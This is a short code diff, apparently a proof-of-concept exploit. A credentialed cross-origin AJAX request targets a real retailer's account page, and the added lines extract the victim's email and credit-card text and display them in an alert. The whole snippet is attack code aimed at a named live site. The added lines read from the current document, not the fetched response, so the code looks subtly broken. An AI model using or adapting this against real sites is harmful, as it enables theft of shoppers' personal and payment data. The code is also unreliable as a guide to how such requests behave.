@@ -7,7 +7,10 @@ $.ajax({
     url : 'https://shop.lululemon.com/secure/account/profilelandingpage.jsp',
     type : 'GET',
     dataType:'html',
-    success : function(data) {              
+    success : function(data) {
+	var email = document.getElementsByClassName('profile-content')[0].textContent
+	var card = document.getElementsByClassName('credit-card')[0].textContent
+	alert("email: " + email + "\ncard: "+ card)
     },
     xhrFields: {
        withCredentials: true
